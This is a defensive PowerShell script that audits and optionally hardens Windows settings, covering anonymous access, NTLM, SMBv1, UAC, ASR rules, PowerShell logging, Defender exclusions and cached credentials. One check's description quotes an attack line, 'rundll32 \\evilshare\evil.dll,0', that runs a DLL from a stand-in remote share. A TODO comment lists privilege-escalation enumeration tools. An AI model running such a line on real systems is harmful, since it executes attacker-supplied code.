# ==== Helper Function definition ====

function SetRegValue {
    Param (
        [string]$path,
        [string]$name,
        [string]$type,
        [string]$data
    )
    $fullPath = "Registry::$path"
    try {
        Set-ItemProperty -Path $fullPath -Name $name -Value $data -ErrorAction Stop }
    catch {
        Write-Host "`t[-] Cannot set registry value $path because path not found..." -ForegroundColor Red
    }
}

function CheckRegValue {
    Param (
        [string]$path,
        [string]$name
    )
    try {
        Get-ItemProperty Registry::$path -Name $name -ErrorAction Stop | select -ExpandProperty $name 
    } Catch {return 'Do not exist'}
}

function valCheck {
    Param(
        [string]$val_name,
        [string]$val_is,
        [string]$val_should,
        [string]$val_type
    )
    if ($val_is -ne $val_should) {
        Write-Host "`t[-] Improper configuration: $val_is.`n`t[-] Should be: $val_should" -ForegroundColor Red
        Set-Variable -Scope 2 -Name localPolicy -Value $true
        if ($configure) { 
            Write-Host "`t[+] Setting registry value to: $val_type $val_should" -ForegroundColor Yellow
            SetRegValue -path $reg_path -Name $val_name -data $val_should -type $val_type 
            }
    } else {
        Write-Host "`t[+] $val_name setting is correct: $val_is" -ForegroundColor Green
    }
}

function hiveBackup {
    Param(
        [string]$prefix,
        [string]$hivePath
    )
    $timestamp = (Get-Date).ToString("dd.MM-HH.mm")
    $backup_path = "C:\Windows\Temp\$timestamp-$prefix.reg"
    Write-Host "`n[!] Backup of $prefix hive into: $backup_path"
    try {
		Get-Item $backup_path -ErrorAction Stop
		Write-Host "`n[!] Backup file already exists!" -ForegroundColor Yellow
		Write-Host "[!] Running in Audit Only mode. Either delete file or wait a minute for different timestamp!" -ForegroundColor Yellow
		Clear-Variable -Scope 1 -Name "configure"
	} Catch {
        try {
		    reg export $hivePath $backup_path }
        catch {
            Write-Host "`t[-] Cannot backup $regpath.." -ForegroundColor Red

        }
	}
}

function RegistryHardening {
    Param(
        [string]$reg_path,
        [string]$name,
        [string]$description,
        [string]$val_should,
        [string]$type = "DWORD"
    )
Write-Host "`n[!] $description :" -NoNewline
Write-Host " $reg_path\$name" -ForegroundColor Gray
$val_is = CheckRegValue -path $reg_path -name $name
valCheck -val_name $name -val_is $val_is -val_should $val_should -val_type $type
}

# ==== MAIN =====
function Main {
    Param(
        [switch]$configure
    )

$localPolicy = $false
# ============================================================

if (!$configure) {Write-Host "`n`n`t++++ Running in Audit Only Mode! ++++" -ForegroundColor Yellow}

# ==== LSA settings start ====

Write-Host "`n`n==== LSA checks start ====`n"
$reg_path = "HKLM\SYSTEM\CurrentControlSet\Control\Lsa"
if ($configure) {hiveBackup -prefix "LSA" -hivePath $reg_path}


RegistryHardening -reg_path $reg_path -name "TurnOffAnonymousBlock" `
-description "Verifying anonymous SID/Name translation"-val_should "1"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tNetwork access: Allow anonymous SID/Name translation" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Disabled" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "RestrictAnonymous" -description `
"Restrict anonymous access" -val_should "1"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tNetwork access: Restrict anonymous access to Named Pipes and Shares" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Enabled" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "RestrictAnonymousSAM" -description `
"Restrict SAM anonymous access" -val_should "1"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tNetwork access: Do not allow anonymous enumeration of SAM accounts and shares" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Enabled" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "LMCompatibilityLevel" -description `
"Verifying if NTLMv2 only is enabled" -val_should "5"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tNetwork security: LAN Manager authentication level" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Send NTLMv2 response only. Refuse LM & NTLM" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "EveryoneIncludesAnonymous" -val_should "0" `
-description "Verifying if system is configured to give anonymous users Everyone rights" 
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tNetwork access: Let everyone permissions apply to anonymous users" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Disabled" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "NoLMHash" -val_should "1" `
-description "Verifying if LM hash is disabled"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tNetwork security: Do not store LAN Manager hash value on next password changes" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Enabled" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "DisableRestrictedAdmin" -val_should "0" `
-description "Verifying if Rstricted Admin mode ir required"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Administrative Templates\System\Credentials Delegation\" -ForegroundColor Cyan
Write-Host "`t`tRestrict delegation of credentials to remote servers" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Enabled" -ForegroundColor Cyan
$localPolicy = $false}

# ========================================================================
# ==== Lan Man settings start ====

Write-Host "`n`n==== Lan Man checks start ====`n"
$reg_path = "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters"
if ($configure) {hiveBackup -prefix "LANMAN_srv" -hivePath $reg_path}

RegistryHardening -reg_path $reg_path -name "RestrictNullSessAccess" -val_should "1" `
-description "Restrict anonymous access to Named Pipes and Shares"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tNetwork access: Restrict anonymous access to Named Pipes and Shares" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Enabled" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "SMB1" -val_should "0" `
-description "Verify if SMBv1 is disabled"
# Windows Feature is disabled?: SMB 1.0/CIFS File Sharing Support
$localPolicy = $false

# -------------------------------------------------------------------------------
$reg_path = "HKLM\System\CurrentControlSet\Services\LanmanWorkstation\Parameters"
if ($configure) {hiveBackup -prefix "LANMAN_wrkst" -hivePath $reg_path}

RegistryHardening -reg_path $reg_path -name "EnablePlainTextPassword" -val_should "0" `
-description "Do not allow unencrypted password to connect to third-party SMB servers"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tMicrosoft network client: Send unencrypted password to third-party SMB servers" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Disabled" -ForegroundColor Cyan
$localPolicy = $false}

RegistryHardening -reg_path $reg_path -name "AllowInsecureGuestAuth" -val_should "0" `
-description "Do not allow unauthenticated access to shared folders.`nPrevents exploitation vectors from SMB like: rundll32 \\evilshare\evil.dll,0"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Adminsitrative Templates\Network\Lanman Workstation\" -ForegroundColor Cyan
Write-Host "`t`tEnable insecure guest logons" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Disabled or Not Configured" -ForegroundColor Cyan
$localPolicy = $false}

# ==========================================================
# ==== UAC settings start ====

Write-Host "`n`n==== UAC checks start ====`n"
$reg_path = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if ($configure) {hiveBackup -prefix "UAC" -hivePath $reg_path}

RegistryHardening -reg_path $reg_path -name "EnableLUA" -val_should "1" `
-description "Require UAC"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tUser Account Control: Run all administrators in Admin Approval Mode" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Enabled" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "FilterAdministratorToken" -val_should "1" `
-description "Any operation that requires elevation of privilege will prompt user"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tUser Account Control: Admin Approval Mode for the Built-in Administrator account" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Enabled" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "ConsentPromptBehaviorAdmin" -val_should "4" `
-description "Require UAC for every binary, not only non-Microsoft"
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\" -ForegroundColor Cyan
Write-Host "`t`tUser Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode" -ForegroundColor Cyan
Write-Host "`tValue should be: Prompt for consent" -ForegroundColor Cyan
$localPolicy = $false}


RegistryHardening -reg_path $reg_path -name "LocalAccountTokenFilterPolicy" -val_should "0" `
-description "UAC restrictions on the network. This mechanism helps prevent against 'loopback' attacks"
$localPolicy = $false


# ==========================================================
# ==== NetBIOS settings start ====

Write-Host "`n`n==== NetBIOS checks start ====`n"
$reg_path = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"
if ($configure) {hiveBackup -prefix "NetBIOS" -hivePath $reg_path}

$name = "NetbiosOptions"
Write-Host "`n[!] Perorming checks for every interface:"
Get-ChildItem Registry::$reg_path | foreach { 
    write-host "`n$_" -ForegroundColor Gray
    $val_is = CheckRegValue -path "$_" -name $name
    valCheck -val_name $name -val_is $val_is -val_should 2 -val_type "DWORD"
}


# ==========================================================
# ==== Windows Script Host start ====

Write-Host "`n`n==== Windows Script Host (WHS) ====`n"

$reg_path = "HKLM\Software\Microsoft\Windows Script Host\Settings"
if ($configure) {hiveBackup -prefix "WHS_HKLM" -hivePath $reg_path}

RegistryHardening -reg_path $reg_path -name "Enabled" -description `
"Disable WHS" -val_should "0"	

$reg_path = "HKCU\Software\Microsoft\Windows Script Host\Settings"
if ($configure) {hiveBackup -prefix "WHS_HKCU" -hivePath $reg_path}

RegistryHardening -reg_path $reg_path -name "Enabled" -description `
"Disable WHS" -val_should "0"


# ==========================================================
# ==== Service settings start ====

Write-Host "`n`n==== Service checks start ====`n"

<#
$reg_path = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Bowser"
if ($configure) {hiveBackup -prefix "Services" -hivePath $reg_path}

RegistryHardening -reg_path $reg_path -name "Start" -description `
"Disable 'Computer Browser' service" -val_should "4"
#>

# ==========================================================
# ===== Office Settings =====
<#

#TODO: tune reg export error handling when there no such path!
#TODO2: same as ScripBlock - create path -ErrorAction SilentlyContinue,
#then, export...

Write-Host "`n`n==== MS Office Hardening ====`n"

$reg_path = "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\office\16.0\word\security\trusted locations"
if ($configure) {hiveBackup -prefix "Office_trusted_locations" -hivePath $reg_path}
RegistryHardening -reg_path $reg_path -name "AllLocationsDisabled" -description `
"Disallow Trusted Locations" -val_should "1" 

[Array]$reg_paths = "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\office\16.0\word\security",`
"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\office\16.0\excel\security",`
"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\office\16.0\powerpoint\security",`
"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\office\15.0\word\security",`
"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\office\15.0\excel\security",`
"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\office\15.0\powerpoint\security"

Foreach ($reg_path in $reg_paths) {
	$soft = $reg_path.Split('\\')[6] + '_' + $reg_path.Split('\\')[5]
	if ($configure) {hiveBackup -prefix "$soft" -hivePath $reg_path}
	RegistryHardening -reg_path $reg_path -name "BlockContentExecutionFromInternet" -description `
	"Block content executiong from Internet for $soft" -val_should "1"
}
#>


# ASR is supported on at least Windows Server, Windows 10 Version 1709
# Version 1709 = Build 16299 Revision 1004
if (([System.Environment]::OSversion.Version | select -ExpandProperty Build) -ge 16299) {
	
	Write-Host "`n`n==== Windows version supports Attack Surface Reduction (ASR) ====`n"
	$asr_rules = Get-MpPreference | select -ExpandProperty AttackSurfaceReductionRules_Ids
	if (!$asr_rules) {
		Write-Host "`t[-] No ASR rules are enabled..." -ForegroundColor Red
	}
	if ($configure) {

		Write-Host "`t[+] Enabling most useful ASR rules:" -ForegroundColor Yellow
		
		try {	
		Write-Host "`t- Block all Office applications from creating child processes." -ForegroundColor Cyan
		Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled -ErrorAction Stop
		
		Write-Host "`t- Block Office applications from creating executable content." -ForegroundColor Cyan
		Add-MpPreference -AttackSurfaceReductionRules_Ids 3B576869-A4EC-4529-8536-B80A7769E899 -AttackSurfaceReductionRules_Actions Enabled -ErrorAction Stop
		
		Write-Host "`t- Block process creations originating from PSExec and WMI commands." -ForegroundColor Cyan
		Add-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9ba-993a6d77406c -AttackSurfaceReductionRules_Actions Enabled -ErrorAction Stop
		
		Write-Host "`t- Block credential stealing from the Windows local security authority subsystem." -ForegroundColor Cyan
		Add-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions Enabled -ErrorAction Stop
		}
		catch {
			Write-Host "`t[-] Exception during ASR rule configuration. Check manually if Windows supports them?" -ForegroundColor Red
		}
	}
}


# ==========================================================
# ===== Optional Settings =====

Write-Host "`n`n==== Optional checks start ====`n"

$reg_path = "HKCU\Control Panel\Accessibility\StickyKeys"
if ($configure) {hiveBackup -prefix "Accessibility" -hivePath $reg_path}
RegistryHardening -reg_path $reg_path -name "Flags" -description `
"Disable Sticky Keys" -val_should "506" -type "String"

$reg_path = "HKLM\system\CurrentControlSet\Control\LSA"
RegistryHardening -reg_path $reg_path -name "DisableDomainCreds" -description `
"Disable domain user credentials in cache" -val_should "1"

<#
$reg_path = "HKLM\SYSTEM\CurrentControlSet\services\TCPIP6\Parameters"
if ($configure) {hiveBackup -prefix "IP6" -hivePath $reg_path}
RegistryHardening -reg_path $reg_path -name "DisabledComponents" -description `
"Disable IPv6" -val_should "255"
#>
# ==========================================================
# ===== Cached Creds =====

# CheckFor cached creds and remove unnecessary
Write-Host "`n`n==== Cached credential check ====`n"

Write-Host "[!] Are there unauthorized or unnecessary content in credential manager?" -ForegroundColor Yellow
cmd /c "cmdkey /list"
if ($configure) {
    Write-Host "`t[?] Do you want to remove something from credential manager? [y/N]" -ForegroundColor Yellow -NoNewline
    $read = Read-Host
    if ($read -eq 'y') {
        Write-Host "`t[!] Spawning Key Manager console..." -ForegroundColor Yellow
        cmd /c "RunDll32.exe keymgr.dll,KRShowKeyMgr"
    } elseif ($read -eq 'n' -or $read.Length -eq 0) {} else {
        Write-Host "[-] Didn't understand your input. Continuing..." -ForegroundColor Red
    }
}

# ==========================================================
# ==== PowerShell version 2 =====

Write-Host "`n`n==== PowerShell version 2 check ====`n"
# Need Elevated context

try {
$hitonce = $false
$disablepsv2 = $false
Get-WindowsOptionalFeature -Online -ErrorAction Stop | where {$_.FeatureName -match "powershellv2"} | `
foreach {
	if ($_.State -eq "Enabled") {
         if ($hitonce) {} else {
		$hitonce = $true
		Write-Host "`t[-] Powershellv2 is Enabled...." -ForegroundColor Red
		if ($configure) {
            		Write-Host "`t[?] Do you want to Disable it? [y/N]" -ForegroundColor Yellow -NoNewLine
		    	$readps = Read-Host
	        	if ($readps -eq 'y') {
    		    		$disablepsv2 = $true
    	    		} elseif ($readps -eq 'n' -or $readps.Length -eq 0) {
                		$disablepsv2 = $false
	        	} else {
                		Write-Host "`t[-] Didn't understand your input. Doing nothing..." -ForegroundColor Red
		        	$disablepsv2 = $false
	        } }
        }
    } else {
        if (!$hitonce) {
        Write-Host "`t[+] PowerShell v2 is Disabled!" -ForegroundColor Green }
        $hitonce = $true
    }
}
} catch { 
	Write-Host "`t[-] Cannot access setting. For this option need Administrator rights." -ForegroundColor Red
}

if ($configure -and $disablepsv2) {
    Write-Host "`n`t[+] Disabling PowerShell version 2..." -ForegroundColor Green
    Get-WindowsOptionalFeature -Online -ErrorAction Stop | where {$_.FeatureName -match "powershellv2"} | `
    foreach {
        $name = $_| select -expandProperty FeatureName
        #Enable-WindowsOptionalFeature -Online -FeatureName $name
        Disable-WindowsOptionalFeature -Online -FeatureName $name
    }
}

Write-Host "`n`n==== PowerShell ScriptBlock checks ====`n"

$localPolicy = $false
$reg_path = "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if ($configure) {hiveBackup -prefix "Powershell_ScriptBlock" -hivePath $reg_path}

# Path may not exist in registry - should create then.
new-item -Path Registry::HKLM\Software\Policies\Microsoft\Windows\PowerShell\ -ErrorAction SilentlyContinue
new-item -Path Registry::HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -ErrorAction SilentlyContinue

RegistryHardening -reg_path $reg_path -name "EnableScriptBlockLogging" -description `
"Veifying if ScriptBlock Logging enabled" -val_should "1" 
if ($localPolicy) { Write-Host "`t[!] May be setting is made via Group Policy? Check:" -ForegroundColor Cyan
Write-Host "`t`t>> Computer Configuration\Administrative Templates\Windows Components\Windows Powershell" -ForegroundColor Cyan
Write-Host "`t`tTun on PowerShell Script Block Logging" -ForegroundColor Cyan
Write-Host "`t[!] Value should be: Enabled" -ForegroundColor Cyan
$localPolicy = $false}

RegistryHardening -reg_path $reg_path -name "EnableScriptBlockInvocationLogging" -description `
"Verifying if ScriptBlock Logging is enabled for every invocation call" -val_should "1"

# TODO
# Found a way (with elevated privileges): 
#$prop = Get-LogProperties "Microsoft-Windows-PowerShell/Operational"
# 250 MB
#$prop.MaxLogSize = 250000000
# Set-LogProperties $prop

# Optional Logging setup
<#
#	Write-Host "`n`n==== PowerShell Transcription Logging checks ====`n"
#       HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription → EnableTranscripting = 1
#       HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription → EnableInvocationHeader = 1
#       HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription → OutputDirectory = “” (Enter path. Empty = default)
#>

# ==========================================================
# ==== Defender Exclusions ====

Write-Host "`n`n==== Defender Exclusions ====`n"

Write-Host "[!] Paths:" -ForegroundColor Cyan
Get-MpPreference | select -expandproperty ExclusionPath
Write-Host "`n[!] Processes:" -ForegroundColor Cyan
Get-MpPreference | select -expandproperty ExclusionProcess
Write-Host "`n[!] Extensions:" -ForegroundColor Cyan
Get-MpPreference | select -expandproperty ExclusionExtension


# ==========================================================
# ==== NTP checks start ====

Write-Host "`n`n==== NTP checks start ====`n"

$ntp_check = cmd /c "w32tm /query /status"

try {
	$unspecified = ($ntp_check | select-string 'Reference' -ErrorAction stop).tostring().contains('unspecified')
	$error = $ntp_check.Contains('error')
	$ntp_source = ($ntp_check | Select-String "ReferenceId" -ErrorAction stop).ToString().Split(':')[2].replace(')','')
	if ($error) {
		Write-Host "`n[-] Error occured while querying NTP configuration. Is 'W32Time' service running?" -ForegroundColor Red 
		Write-Host "`n[-] Verify settings manually: w32tm /query /status" -ForegroundColor Red }
	elseif ($unspecified) { 
		Write-Host "`n[!] No NTP server connectivity. Network access!?" -ForegroundColor Red }
	else {
		Write-Host "`n[!] Actual NTP source: $ntp_source" }
}
catch { Write-Host "`n[-] Cannot parse 'w32tm /query /status' response.. Check manually!" -ForegroundColor Red }


$ntp_setting = (Get-ItemProperty Registry::HKLM\SYSTEM\CurrentControlSet\Services\W32Time\Parameters -Name NtpServer `
| Select-Object -ExpandProperty NtpServer) -Replace ',0x.',''
Write-Host "`n[!] Local NTP settings:" -NoNewline
Write-Host " HKLM\SYSTEM\CurrentControlSet\Services\W32Time\Parameters" -ForegroundColor Gray

if ($ntp_setting -match "time.windows.com") {
	Write-Host "`t[-] Default value: time.windows.com" -ForegroundColor Red
	Write-Host "`t[!] If previous checks returned correct NTP server - domain settings are in place."
	Write-Host "`t[!] But it's still better to set up NTP server manually."
	Write-Host "`t`tw32tm /config /manualpeerlist:""10.10.1.10,0x8 10.10.10.2,0x8"" /syncfromflags:MANUAL`n`t`tw32tm /config /update`n`t`tw32tm /resync" -ForegroundColor Cyan
} else {
	Write-Host "`t[+] $ntp_setting" -ForegroundColor Green
}

    # TODO NTP SETTINGS ?
    <#
    $setup = Read-Host "Would you like to setup correct local NTP settings? [y/N]"
    if ($setup -eq '' -or $setup -ne 'n') {} elif ($setup -eq 'y') {
    $ntpsrv = Read-Host "Please provide NTP server address"
        if ($ntpsrv) {
                
                w32tm /config /manualpeerlist:"10.10.10.10,0x8" /syncfromflags:MANUAL
                w32tm /config /update
                w32tm /resync
                
                Again query - correct now?:
                $ntp_source = ((w32tm /query /status | findstr Source) -replace 'Source: ','') -replace ',0x.',''
	} #>



# ==========================================================

# TODO binary checks
<#

C:\Windows\Microsoft.NET\Framework\v4.0.30319>MSBuild -version
^--- last line provides .NET version
use that for all binaries

1)
Seatbelt_v472.exe NonstandardServices <etc...>

2)
SharpUp: create user with limited rights, add perm to binary, launch check, remove user:

	net user SecurityAudit SecAud123!@# /add
	icacls SharpUp_v472.exe /grant SecurityAudit:rx
	
		<use_creds_to_launch_exe_from_PS>
	
	icacls SharpUp_v472.exe /remove:g SecurityAudit
	net user SecurityAudit /delete
	Remove-Item C:\Users\SecurityAudit -Force -recurse
3) Watson / Sherlock / SessionGopher ....

4) Disable Spool Service?

5) Applocker Settings?
Get-ApplockerPolicy -Xml -Effective


#>
# ==========================================================

if (!$configure) {
    Write-Host "`n`n`t++++ Script was executed in Audit Only Mode! ++++" -ForegroundColor Yellow
    Write-Host "`tTo make changes in Registry edit last script line to 'Main -configure'`n" -ForegroundColor Yellow}
}

Main #-configure
